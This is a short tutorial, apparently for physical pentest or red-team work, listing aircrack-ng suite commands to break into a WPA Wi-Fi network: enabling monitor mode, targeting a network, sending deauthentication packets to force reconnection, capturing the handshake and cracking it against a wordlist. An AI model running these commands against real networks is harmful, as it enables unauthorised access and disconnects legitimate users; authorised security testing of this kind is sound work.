Our way into a network during a physical pentest/red team is through the wifi. Now to get into the network you will need the wifi password. So lets just get straight into it

Step 1: Check that your wifi adapter exists
`iwconfig/ifconfig`

Step 2: Enable monitor mode
`$ sudo airmon-ng start wlan0`

Step 3: Scan for and identify target network(s)
`$ sudo airodump-ng wlan0mon`

Step 4: Focus on target network(s)
`$ sudo airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon`

Step 5: Trigger recconection
`$ sudo aireplay-ng --deauth <number of packets> -a <bssid> wlan0mon`

Step 6: Capture and crack handshake
` CH 6 ][ WPA handshake: <bssid>`
`$ aircrack-ng capture.cap -w wordlist.txt`